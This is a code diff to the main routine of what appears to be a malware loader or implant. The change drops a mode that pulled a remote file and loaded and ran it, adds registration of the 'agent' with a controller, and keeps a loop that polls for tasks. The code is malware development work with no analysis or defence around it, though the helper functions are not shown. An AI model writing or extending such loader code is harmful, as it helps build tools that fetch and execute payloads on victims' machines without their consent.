@@ -5,7 +5,8 @@ LdrInstance *ldr = NULL;
 
 
 
-void LdrMain() {
+void LdrMain() 
+{
 #ifdef DEBUG 
 	AllocConsole();
 #endif
@@ -20,21 +21,12 @@ void LdrMain() {
 		DBGA("[!] Failed Parsing config\n");
 		LdrExitThread(0);
 	}
+	DBGA("[*] Parsed Config\n");
 
-
-#ifdef LOAD_AND_EXIT
-	DBGA("[+] Pulling file...\n");
-	LdrTask task = LdrPullFile();
-	if(!task.ok) {
-		DBGA("[!] Failed Pulling file\n");
+	if(!LdrRegisterAgent()) {
 		LdrExitThread(0);
 	}
 
-	if(!LdrLoadAndRun(task, FALSE)) {
-		DBGA("[!] Failed Loading file\n");
-		LdrExitThread(0);
-	}
-#else
 	LdrInitPoll();
 	DBGA("[*] Going into poll Loop\n");
 	while(TRUE) {
@@ -65,6 +57,5 @@ void LdrMain() {
 
 		}
 	}
-#endif
 		
 }
